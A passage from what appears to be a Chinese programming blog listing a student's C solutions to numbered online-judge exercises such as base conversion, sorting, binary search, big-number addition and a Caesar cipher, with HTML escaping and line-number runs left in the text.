j\u0026lt;\u0026#39;X\u0026#39;+3; j++) { for(k=\u0026#39;X\u0026#39;; k\u0026lt;\u0026#39;X\u0026#39;+3; k++) { if(j!=i\u0026amp;\u0026amp;k!=i\u0026amp;\u0026amp;k!=j) { if(i==\u0026#39;X\u0026#39;||k==\u0026#39;X\u0026#39;||k==\u0026#39;Z\u0026#39;) { continue; } else { printf(\u0026#34;%c %c\\n%c %c\\n%c %c\\n\u0026#34;,\u0026#39;A\u0026#39;,i,\u0026#39;B\u0026#39;,j,\u0026#39;C\u0026#39;,k); } } } } } return 0; } 1025计算时间 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; int time_elapse(int hour, int minute, int second) { return hour*3600+minute*60+second; } int main() { int n; char t[9],s[9]; int a,b,c,d,e,f; int s1,s2; scanf(\u0026#34;%d\u0026#34;,\u0026amp;n); for(; n\u0026gt;0; n--) { while(getchar()!=\u0026#39;\\n\u0026#39;); scanf(\u0026#34;%s%s\u0026#34;,t,s); a=t[0]*10+t[1]-528; b=t[3]*10+t[4]-528; c=t[6]*10+t[7]-528; d=s[0]*10+s[1]-528; e=s[3]*10+s[4]-528; f=s[6]*10+s[7]-528; s1=time_elapse(a,b,c); s2=time_elapse(d,e,f); printf(\u0026#34;%d %d %d\\n\u0026#34;,s1,s2,(s1\u0026gt;s2?s1-s2:s2-s1)); } return 0; } 1026非递归斐波那契 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; int fibonacci(int n) { int a,b; a=b=1; while(n--\u0026gt;1){ b=b+a; a=b-a; } return b; } int main() { int n,m; scanf(\u0026#34;%d\u0026#34;,\u0026amp;n); for(; n\u0026gt;0; n--) { scanf(\u0026#34;%d\u0026#34;,\u0026amp;m); printf(\u0026#34;%d\\n\u0026#34;,fibonacci(m)); } return 0; } /* #include\u0026lt;iostream\u0026gt; using namespace std; int main(){ int n, i, f1, f2; cin\u0026gt;\u0026gt;n; f1 = 0; f2 = 1; while(n--\u0026gt;1){ f2 += f1; f1 = f2 - f1; } cout\u0026lt;\u0026lt;(n==-1?0:f2)\u0026lt;\u0026lt;endl; } */ 1028递归转换进制 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; //#define A 10 #define B 7 int change(int n) { int temp; if(n\u0026lt;B) { printf(\u0026#34;%d\u0026#34;,n); return 0; } else { change(n/B); change(n%B); } } int main() { int n,m; scanf(\u0026#34;%d\u0026#34;,\u0026amp;n); for(; n\u0026gt;0; n--) { scanf(\u0026#34;%d\u0026#34;,\u0026amp;m); change(m); printf(\u0026#34;\\n\u0026#34;); } return 0; } 1029求自然对数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; int main() { int i; double fenMu=1; double ans=1; for(i=1;fenMu-1e15\u0026lt;0;i++){ fenMu*=i; ans+=1.0/fenMu; } printf(\u0026#34;%.14lf\\n\u0026#34;,ans); return 0; } 1030二次方程 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;math.h\u0026gt; int fangcheng(int a,int b,int c) { double x1,x2,dal; if(a!=0) { if(b*b-4*a*c\u0026gt;0) { dal=pow(b*b-4*a*c,0.5); x1=(-b-dal)/(double)(2*a); x2=(-b+dal)/(double)(2*a); if(a\u0026lt;0) { dal=x1; x1=x2; x2=dal; } printf(\u0026#34;%.2lf %.2lf\u0026#34;,x1,x2); return 0; } else if(b*b-4*a*c==0) { if(b==0) { printf(\u0026#34;0.00\u0026#34;); return 0; } else { printf(\u0026#34;%.2lf\u0026#34;,-(double)b/(2*a)); return 0; } } else { printf(\u0026#34;NULL\u0026#34;); return 0; } } else { if(b==0) { if(c==0) { printf(\u0026#34;NULL\u0026#34;); return 0; } else { printf(\u0026#34;NULL\u0026#34;); return 0; } } else { if(c==0) { printf(\u0026#34;0.00\u0026#34;); return 0; } else { printf(\u0026#34;%.2lf\u0026#34;,-c/(double)b); return 0; } } } } int main() { int n,a,b,c,i; scanf(\u0026#34;%d\u0026#34;,\u0026amp;n); for(i=1; i\u0026lt;=n; i++) { scanf(\u0026#34;%d%d%d\u0026#34;,\u0026amp;a,\u0026amp;b,\u0026amp;c); printf(\u0026#34;Case %d: \u0026#34;,i); fangcheng(a,b,c); printf(\u0026#34;\\n\u0026#34;); } return 0; } 1034十进制转二进制 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #include\u0026lt;stdio.h\u0026gt; int main() { int n,i,j; long long a; int b[33]; scanf(\u0026#34;%d\u0026#34;,\u0026amp;n); for(i=0; i\u0026lt;n; i++) { scanf(\u0026#34;%lld\u0026#34;,\u0026amp;a); j=0; if(a==0){printf(\u0026#34;%ld\\n\u0026#34;,a);continue;} while(a!=0) { b[j++]=a%2; a=a/2; } while(--j\u0026gt;=0){ printf(\u0026#34;%d\u0026#34;,b[j]); } printf(\u0026#34;\\n\u0026#34;); } return 0; } 1035十进制转其他 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include\u0026lt;stdio.h\u0026gt; int main() { int n,i,j,jidi; long long a; int b[33]; // scanf(\u0026#34;%d\u0026#34;,\u0026amp;n); n=60000; printf(\u0026#34;本程序提供2**32以下十进制正整数转任意36以内进制结果\\ \\n输入(-1,-1)结束\\n\u0026#34;); printf(\u0026#34;请每次输入两个数，前者作为基底，后者待转换\\n\u0026#34;); for(i=0; i\u0026lt;n; i++) { scanf(\u0026#34;%d%lld\u0026#34;,\u0026amp;jidi,\u0026amp;a);if(jidi==-1){break;} j=0; if(a==0){printf(\u0026#34;%lld\\n\u0026#34;,a);continue;} while(a!=0) { b[j++]=a%jidi; a=a/jidi; } while(--j\u0026gt;=0){ if(b[j]\u0026gt;9){printf(\u0026#34;%c\u0026#34;,\u0026#39;A\u0026#39;-10+b[j]);} else {printf(\u0026#34;%d\u0026#34;,b[j]);} } printf(\u0026#34;\\n\u0026#34;); } return 0; } 1036字符替换 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #include\u0026lt;stdio.h\u0026gt; int substitute(char str[], char oldchar, char newchar) { int time=0; int i=0; while(str[i]!=\u0026#39;\\0\u0026#39;) { if(str[i]==oldchar) { str[i]=newchar; time++; } i++; } return time; } int main() { char str[1001]; char oldchar,newchar; while (scanf(\u0026#34;%s %c %c\u0026#34;, str, \u0026amp;oldchar, \u0026amp;newchar) == 3) /* 或!= EOF , 但前者更好 */ { printf(\u0026#34;%d \u0026#34;,substitute(str,oldchar,newchar)); puts(str); //处理 } return 0; } 1037关键词统计 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; int main() { int i,j,k,n,times,flag; char str[10][11]; char long_str[10001]; scanf(\u0026#34;%d\u0026#34;,\u0026amp;n); for(i=0;i\u0026lt;n;i++){ scanf(\u0026#34;%s\u0026#34;,str[i]); } scanf(\u0026#34;%s\u0026#34;,long_str); for(i=0;i\u0026lt;n;i++){ times=0; for(j=0;j\u0026lt;strlen(long_str)-strlen(str[i])+1;){ if(long_str[j]==str[i][0]){ flag=0; for(k=0;k\u0026lt;strlen(str[i]);k++){ if(long_str[j+k]!=str[i][k]){ flag=1;break; } } if(flag==1){j++;} else{ times++;j+=k; } } else{j++;} } printf(\u0026#34;%d\\n\u0026#34;,times); } return 0; } 1037学号查询 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; struct student { char name[32]; char birth[9]; char num[9]; char major[32]; }; int main() { struct student stu[30]; int i,j,n; char num1[9]; for(i=0;i\u0026lt;30;i++){ scanf(\u0026#34;%s %s %s %s\u0026#34;,stu[i].name,stu[i].birth,stu[i].num,stu[i].major); } scanf(\u0026#34;%d\u0026#34;,\u0026amp;n); for(i=0;i\u0026lt;n;i++){ scanf(\u0026#34;%s\u0026#34;,num1); for(j=0;j\u0026lt;30;j++){ if(strcmp(stu[j].num,num1)==0){ printf(\u0026#34;%s %s %s %s\\n\u0026#34;,stu[j].name,stu[j].birth,stu[j].num,stu[j].major); break; } } if(j==30){ printf(\u0026#34;Not found\\n\u0026#34;); } } } 1038插入排序 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; int main() { int nCase,i,j,k,temp; int n; int s[1000]; scanf(\u0026#34;%d\u0026#34;,\u0026amp;nCase); for(i=0; i\u0026lt;nCase; i++) { scanf(\u0026#34;%d\u0026#34;,\u0026amp;n); for(j=0; j\u0026lt;n; j++) { scanf(\u0026#34;%d\u0026#34;,s+j); } for(j=0; j\u0026lt;n; j++) { temp=s[j]; for(k=j-1; k\u0026gt;=0; k--) { if(s[k]\u0026gt;temp) { s[k+1]=s[k]; } else { break; } } s[k+1]=temp; } for(j=0; j\u0026lt;n; j++) { printf(\u0026#34;%d \u0026#34;,s[j]); } printf(\u0026#34;\\n\u0026#34;); } } 1042折半查找 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #include\u0026lt;stdio.h\u0026gt; int data[20000]; int binary_search(int d[], int s, int e, int q) { int mid; while(s\u0026lt;=e) { mid=(s+e)/2; if(d[mid]==q) { return mid; } else if(d[mid]\u0026lt;q){s=mid+1;} else{e=mid-1;} } return -1; } int main() { int n,i,m,s,e,q; scanf(\u0026#34;%d\u0026#34;,\u0026amp;n); for(i=0; i\u0026lt;n; i++) { scanf(\u0026#34;%d\u0026#34;,data+i); } scanf(\u0026#34;%d\u0026#34;,\u0026amp;m); for(i=0; i\u0026lt;m; i++) { scanf(\u0026#34;%d %d %d\u0026#34;,\u0026amp;s,\u0026amp;e,\u0026amp;q); if(e\u0026gt;n){e=n;} if(s\u0026gt;n-1||s\u0026gt;e-1){printf(\u0026#34;-1\\n\u0026#34;);continue;} printf(\u0026#34;%d\\n\u0026#34;,binary_search(data,s,e-1,q)); } return 0; } 1043矩阵加法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 #include\u0026lt;stdio.h\u0026gt; int main() { int M,N,a[11][11],b[11][11]; int i,j,flag,num; while(scanf(\u0026#34;%d\u0026#34;,\u0026amp;M)==1\u0026amp;\u0026amp;M!=0\u0026amp;\u0026amp;scanf(\u0026#34;%d\u0026#34;,\u0026amp;N)==1) { for(i=1; i\u0026lt;=M; i++) { for(j=1; j\u0026lt;=N; j++) { scanf(\u0026#34;%d\u0026#34;,\u0026amp;a[i][j]); } } for(i=1; i\u0026lt;=M; i++) { for(j=1; j\u0026lt;=N; j++) { scanf(\u0026#34;%d\u0026#34;,\u0026amp;b[i][j]); } } for(i=1; i\u0026lt;=M; i++) { for(j=1; j\u0026lt;=N; j++) { a[i][j]+=b[i][j]; } } num=0; for(i=1; i\u0026lt;=M; i++) { flag=1; for(j=1; j\u0026lt;=N; j++) { if(a[i][j]!=0) { flag=0; break; } } if(flag==1) { num++; } } for(i=1; i\u0026lt;=N; i++) { flag=1; for(j=1; j\u0026lt;=M; j++) { if(a[j][i]!=0) { flag=0; break; } } if(flag==1) { num++; } } printf(\u0026#34;%d\\n\u0026#34;,num); } return 0; } 1044逗号加法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 #include\u0026lt;stdio.h\u0026gt; int main() { char a[20],b[20]; long long A,B,temp; int i,j; while(scanf(\u0026#34;%s %s\u0026#34;,a,b)==2) { A=B=0; for(i=0; a[i]!=\u0026#39;\\0\u0026#39;; i++); j=-1;temp=1; while(--i\u0026gt;=0) { if(a[i]-\u0026#39;0\u0026#39;\u0026gt;-1\u0026amp;\u0026amp;a[i]-\u0026#39;0\u0026#39;\u0026lt;10) { j++;temp=10*temp; A+=(a[i]-\u0026#39;0\u0026#39;)*temp/10; } if(a[i]==\u0026#39;,\u0026#39;)continue; if(a[i]==\u0026#39;-\u0026#39;)A=-A; } for(i=0; b[i]!=\u0026#39;\\0\u0026#39;; i++); j=-1;temp=1; while(--i\u0026gt;=0) { if(b[i]-\u0026#39;0\u0026#39;\u0026gt;-1\u0026amp;\u0026amp;b[i]-\u0026#39;0\u0026#39;\u0026lt;10) { j++;temp=10*temp; B+=(b[i]-\u0026#39;0\u0026#39;)*temp/10; } if(b[i]==\u0026#39;,\u0026#39;)continue; if(b[i]==\u0026#39;-\u0026#39;)B=-B; } printf(\u0026#34;%lld\\n\u0026#34;,A+B); } return 0; } 1046统计字符 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #include\u0026lt;stdio.h\u0026gt; int main() { char a[7],na[7],b[1001]; int i,j,k; while(fgets(a,7,stdin)\u0026amp;\u0026amp;a[0]!=\u0026#39;#\u0026#39;) { for(i=0; a[i]!=\u0026#39;\\0\u0026#39;; i++); for(j=0; j\u0026lt;7; j++) { na[j]=0; } fgets(b,1000,stdin); for(k=0; b[k]!=\u0026#39;\\0\u0026#39;; k++) { for(j=0; j\u0026lt;i; j++) { if(b[k]==a[j]) { na[j]++; } } } for(j=0; j\u0026lt;i-1; j++) { printf(\u0026#34;%c %d\\n\u0026#34;,a[j],na[j]); } } return 0; } 1048ZOJ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include\u0026lt;stdio.h\u0026gt; int main() { int z,o,j,i; z=o=j=0; char a[101]; while(fgets(a,101,stdin)\u0026amp;\u0026amp;a[0]!=\u0026#39;E\u0026#39;){ for(i=0;a[i]!=\u0026#39;\\0\u0026#39;;i++){ if(a[i]==\u0026#39;Z\u0026#39;){z++;continue;} if(a[i]==\u0026#39;O\u0026#39;){o++;continue;} if(a[i]==\u0026#39;J\u0026#39;){j++;continue;} } while(1){ if(z\u0026gt;0){printf(\u0026#34;Z\u0026#34;);z--;} if(o\u0026gt;0){printf(\u0026#34;O\u0026#34;);o--;} if(j\u0026gt;0){printf(\u0026#34;J\u0026#34;);j--;} if(z==0\u0026amp;\u0026amp;o==0\u0026amp;\u0026amp;j==0){break;} } printf(\u0026#34;\\n\u0026#34;);z=o=j=0; } return 0; } 1049不循环反转数组（递归） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #include\u0026lt;stdio.h\u0026gt; int a[100]; void reverse(i) { if(i==1){scanf(\u0026#34;%d\u0026#34;,a+i);printf(\u0026#34;%d \u0026#34;,a[i]);} else { scanf(\u0026#34;%d\u0026#34;,a+i);reverse(i-1);printf(\u0026#34;%d \u0026#34;,a[i]); } } int main() { int n,i; scanf(\u0026#34;%d\u0026#34;,\u0026amp;n); reverse(n); return 0; } 1050百鸡问题 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #include\u0026lt;stdio.h\u0026gt; int main() { int x,y,z,n,i,j,k; while(scanf(\u0026#34;%d\u0026#34;,\u0026amp;n)==1\u0026amp;\u0026amp;n!=EOF){ for(i=0;i\u0026lt;n/5+1;i++){ for(j=0;j\u0026lt;(n-5*i)/3+1;j++){ if(5*i+3*j+(100-i-j+2)/3\u0026lt;n+1){ printf(\u0026#34;x=%d,y=%d,z=%d\\n\u0026#34;,i,j,100-i-j); } } } } return 0; } 1051折半查找\u0026rsquo;小于\u0026rsquo;临界点 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #include\u0026lt;stdio.h\u0026gt; int data[20000]; int binary_search(int d[], int s, int e, int q) { int s0=s,e0=e; int mid; if(d[s]\u0026gt;q-1){return 0;} if(d[e]\u0026lt;q){return e0-s0+1;} while(1){ mid=(s+e)/2; if(d[mid]\u0026lt;q){ if(d[mid+1]\u0026lt;q){s=mid+1;} else{return mid-s0+1;} } else if(d[mid]\u0026gt;q){e=mid-1;} else{e--;} } } int main() { int n,i,m,s,e,q; scanf(\u0026#34;%d\u0026#34;,\u0026amp;n); for(i=0; i\u0026lt;n; i++) { scanf(\u0026#34;%d\u0026#34;,data+i); } scanf(\u0026#34;%d\u0026#34;,\u0026amp;m); for(i=0; i\u0026lt;m; i++) { scanf(\u0026#34;%d %d %d\u0026#34;,\u0026amp;s,\u0026amp;e,\u0026amp;q); if(s==n||s==e) { printf(\u0026#34;-1\\n\u0026#34;); continue; } printf(\u0026#34;%d\\n\u0026#34;,binary_search(data,s,e-1,q)); } return 0; } 1052全排列 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; #define N 10 //#define D printf(\u0026#34;m=%d\\tproduct=%d\\tstart=%d\\ti=%d\\tj=%d\\tk=%d\\tt=%d\\n\u0026#34;,m,product,start,i,j,k,t); //#define M for(start=0;start\u0026lt;len;start++){printf(\u0026#34;%d \u0026#34;,index[start]);}printf(\u0026#34;\\n\u0026#34;); void mySort(char* s) { int len=strlen(s); int i,j; char temp; for(i=0;i\u0026lt;len;i++){ for(j=i+1;j\u0026lt;len;j++){ if(s[i]\u0026gt;s[j]){ temp=s[i];s[i]=s[j];s[j]=temp; } } } } int main() { char str[N+1],res[N+1],index[N+1]; int m,i,j,k,t,product,len; int start; while(scanf(\u0026#34;%s%d\u0026#34;,str,\u0026amp;m)==2){ len=strlen(str); mySort(str); //puts(str); for(i=0;i\u0026lt;len;i++){index[i]=i;} for(i=product=1;i\u0026lt;len+1;i++){ product*=i; if(product\u0026gt;m){break;} } for(j=0;j\u0026lt;len-i;j++){ res[j]=str[j]; index[j]=-1; } //从后往前数第i个字母前的都是按全排列的第一个排列的顺序排列 // printf(\u0026#34;m=%d\\tproduct=%d\\ti=%d\\n\u0026#34;,m,product,i); while(j\u0026lt;len){ product/=i; //D start=m/product; //D for(t=0;index[t]==-1\u0026amp;\u0026amp;t\u0026lt;len;t++); //D for(k=t;start!=0;k++){ if(index[k]!=-1){start--;} else{continue;} } while(index[k]==-1){k++;} //printf(\u0026#34;%d***%d***\\n\u0026#34;,k,index[k]); D res[j]=str[k]; index[k]=-1; m%=product; // D M i--;j++; // printf(\u0026#34;########################\\n\u0026#34;); } res[j]=\u0026#39;\\0\u0026#39;; puts(res); } return 0; } 1053画菱形 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include\u0026lt;stdio.h\u0026gt; int main() { int n,i,j; while(scanf(\u0026#34;%d\u0026#34;,\u0026amp;n)==1){ for(i=0 ;i\u0026lt;n+1;i++){ for(j=0;j\u0026lt;2*n-2*i;j++){printf(\u0026#34; \u0026#34;);} for(j=0;j\u0026lt;4*i+1;j++){printf(\u0026#34;*\u0026#34;);} printf(\u0026#34;\\n\u0026#34;); } for(i=n-1 ;i\u0026gt;-1;i--){ for(j=0;j\u0026lt;2*n-2*i;j++){printf(\u0026#34; \u0026#34;);} for(j=0;j\u0026lt;4*i+1;j++){printf(\u0026#34;*\u0026#34;);} printf(\u0026#34;\\n\u0026#34;); } } return 0; } 1054冒泡排序交换次数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include\u0026lt;stdio.h\u0026gt; int main() { int n,i,j,a[1000],temp,t; while(scanf(\u0026#34;%d\u0026#34;,\u0026amp;n)==1\u0026amp;\u0026amp;n!=0){ for(i=0 ;i\u0026lt;n;i++){ scanf(\u0026#34;%d\u0026#34;,a+i); } for(i=0,t=0;i\u0026lt;n;i++){ for(j=i+1;j\u0026lt;n;j++){ if(a[j]\u0026lt;a[i]){temp=a[j];a[j]=a[i];a[i]=temp;t++;} } } printf(\u0026#34;%d\\n\u0026#34;,t); } return 0; } 1055凯撒密码+K 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #include\u0026lt;stdio.h\u0026gt; int main() { char a[100]; int i,j; long k; while(scanf(\u0026#34;%s\u0026#34;,a)==1){ scanf(\u0026#34;%ld\u0026#34;,\u0026amp;k); for(i=0;a[i]!=\u0026#39;\\0\u0026#39;;i++){ j=(k+i+1)%26; a[i]=(a[i]-\u0026#39;A\u0026#39;+26-j)%26+\u0026#39;A\u0026#39;; } puts(a); } return 0; } 1056大数相加 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include\u0026lt;stdio.h\u0026gt; #define N 1000+2 int main() { int n,i,j,k,m,len1,len2,jinwei; char a[N],b[N],c[N]; scanf(\u0026#34;%d\u0026#34;,\u0026amp;n); for(m=0;m\u0026lt;n;m++){ scanf(\u0026#34;%s%s\u0026#34;,a,b); //向右对齐，左边补零 for(j=0;a[j]!=\u0026#39;\\0\u0026#39;;a[j]-=\u0026#39;0\u0026#39;,j++); for(len1=j+1;j\u0026gt;-1;a[j+N-len1]=a[j],j--); for(j=N-1-len1;j\u0026gt;-1;a[j]=0,j--); for(k=0;b[k]!=\u0026#39;\\0\u0026#39;;b[k]-=\u0026#39;0\u0026#39;,k++); for(len2=k+1;k\u0026gt;-1;b[k+N-len2]=b[k],k--); for(k=N-1-len2;k\u0026gt;-1;b[k]=0,k--); //相加 jinwei=0; for(i=N-2;i\u0026gt;-1;i--){ c[i]=(a[i]+b[i]+jinwei)%10; jinwei=(a[i]+b[i]+jinwei)/10; } //输出 for(i=0;c[i]==0\u0026amp;\u0026amp;i\u0026lt;N-1;i++); if(i==N-1){printf(\u0026#34;0\\n\u0026#34;);continue;}//考虑输入为(0,0)的情况 for(;i\u0026lt;N-1;i++){printf(\u0026#34;%d\u0026#34;,c[i]);} printf(\u0026#34;\\n\u0026#34;); } return 0; } 1057二分法解方程浮点 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;math.h\u0026gt; #define func(x) 2*x*x*x-4*x*x+3*x-6 int main() { int i,flag; double y,x,hi,lo; while(scanf(\u0026#34;%lf\u0026#34;,\u0026amp;y)==1) { flag=0; hi=10000; lo=-10000; if(func(lo)-y\u0026gt;0||func(hi)-y\u0026lt;0) { printf(\u0026#34;NULL\\n\u0026#34;);continue; } while(!(fabs(lo-hi)\u0026lt;0.000001)) { x=(hi+lo)/2.0; if(func(x)-y\u0026gt;0) { hi=x; } else if(func(x)-y\u0026lt;0) { lo=x; } } printf(\u0026#34;%.4lf\\n\u0026#34;,x); } return 0; } 1058小试指针 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #include\u0026lt;stdio.h\u0026gt; int main() { int arr[10]={1,3,5,7,9,11,13,15,17,19}; int *pt=arr; // int *a,*b,*c,*d; //a=b=c=d=arr; printf(\u0026#34;%p\\n%p\\n%p\\n%d\\n\u0026#34;,\u0026amp;arr[0],\u0026amp;pt,pt,*pt); printf(\u0026#34;%d\\n\u0026#34;,*pt+3); printf(\u0026#34;%d\\n\u0026#34;,pt[3]); printf(\u0026#34;%p\\n\u0026#34;,\u0026amp;*pt); printf(\u0026#34;%p\\n\u0026#34;,*\u0026amp;pt); //printf(\u0026#34;%d\\n\u0026#34;,*pt[3]); printf(\u0026#34;%d\\n\u0026#34;,*(pt+3)); printf(\u0026#34;%d\\n\u0026#34;,*pt++); printf(\u0026#34;%d\\n\u0026#34;,*(pt++)); printf(\u0026#34;%d\\n\u0026#34;,(*pt)++); printf(\u0026#34;%d\\n\u0026#34;,++(*pt)); return 0; } 1060转置矩阵 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; int main() { int m,n,i,j; int *p; while(scanf(\u0026#34;%d%d\u0026#34;,\u0026amp;m,\u0026amp;n)==2){ p=(int*)malloc(sizeof(int)*m*n); for(i=0;i\u0026lt;m;i++){ for(j=0;j\u0026lt;n;j++){ scanf(\u0026#34;%d\u0026#34;,p+i*n+j); } } for(i=0;i\u0026lt;n;i++){ for(j=0;j\u0026lt;m;j++){ printf(\u0026#34;%d \u0026#34;,*(p+j*n+i)); } printf(\u0026#34;\\n\u0026#34;); } free(p); } } 1061成绩查询 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;math.h\u0026gt; #define N 10 struct student { int id; int score; }; void findmax(struct student *stu, int *score, int *index) { int i; *score=(*stu).score; *index=0; for(i=0; i\u0026lt;N; i++) { if(*score\u0026lt;(*(stu+i)).score) { *score=(*(stu+i)).score; *index=i; } } } void findmin(struct student *stu, int *score, int *index) { int i; *score=(*stu).score; *index=0; for(i=0; i\u0026lt;N; i++) { if(*score\u0026gt;(*(stu+i)).score) { *score=(*(stu+i)).score; *index=i; } } } void findaver(struct student *stu, int *score, int *index) { int sum,i; int delta,delta_min; for(i=sum=0; i\u0026lt;N; i++) { sum+=(*(stu+i)).score; } *score=(*stu).score; *index=0; delta_min=fabs((*stu).score*N-sum); for(i=0; i\u0026lt;N; i++) { delta=fabs((*(stu+i)).score*N-sum); if(delta\u0026lt;delta_min) { delta_min=delta; *score=(*(stu+i)).score; *index=i; } } } int main() { struct student *stu=(struct student*)malloc(sizeof(struct student)*N); int i; int score,index; for(i=0; i\u0026lt;N; i++) { scanf(\u0026#34;%d %d\u0026#34;,\u0026amp;((*(stu+i)).id),\u0026amp;((*(stu+i)).score)); } findmax(stu,\u0026amp;score,\u0026amp;index); printf(\u0026#34;%d %d\\n\u0026#34;,(*(stu+index)).id,score); findmin(stu,\u0026amp;score,\u0026amp;index); printf(\u0026#34;%d %d\\n\u0026#34;,(*(stu+index)).id,score); findaver(stu,\u0026amp;score,\u0026amp;index); printf(\u0026#34;%d %d\\n\u0026#34;,(*(stu+index)).id,score); free(stu); return 0; } 1063查找子字符串 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; char *findstr(char *s, char *t) { int i,j,flag; for(i=0; *(s+i)!=\u0026#39;\\0\u0026#39;; i++) { if(*(s+i)==*t) { flag=1; for(j=1; *(t+j)!=\u0026#39;\\0\u0026#39;; j++) { if(*(s+i+j)!=*(t+j)) { flag=0; break; } } if(flag==1) { return s+i; } } } return NULL; } int main() { char *s=(char*)malloc(sizeof(char)*1001); char *t=(char*)malloc(sizeof(char)*1001); while(scanf(\u0026#34;%s%s\u0026#34;,s,t)==2) { printf(\u0026#34;%p %p\\n\u0026#34;,s,findstr(s,t)); } return 0; } 1064队列操作 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; //#define D printf(\u0026#34;front=%d\\trear=%d\\n\u0026#34;,front,rear); typedef int datatype; int main() { int n,m,op,id,front,rear; while(scanf(\u0026#34;%d%d\u0026#34;,\u0026amp;n,\u0026amp;m)==2){ n++; datatype* a=(datatype*)malloc(sizeof(datatype)*(n)); front=rear=0; while(m--){ scanf(\u0026#34;%d%d\u0026#34;,\u0026amp;op,\u0026amp;id); if(1==op){ if((rear+1)%n!=front){ a[rear]=id; rear=(rear+1)%n; } // D } else if(2==op){ if(rear!=front){ front=(front+1)%n; } // D }else {continue;} } if(front==rear){printf(\u0026#34;NULL\\n\u0026#34;);continue;} while(front!=rear){ printf(\u0026#34;%d \u0026#34;,a[front]); front=(front+1)%n; }printf(\u0026#34;\\n\u0026#34;); } return 0; } 1065栈操作 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 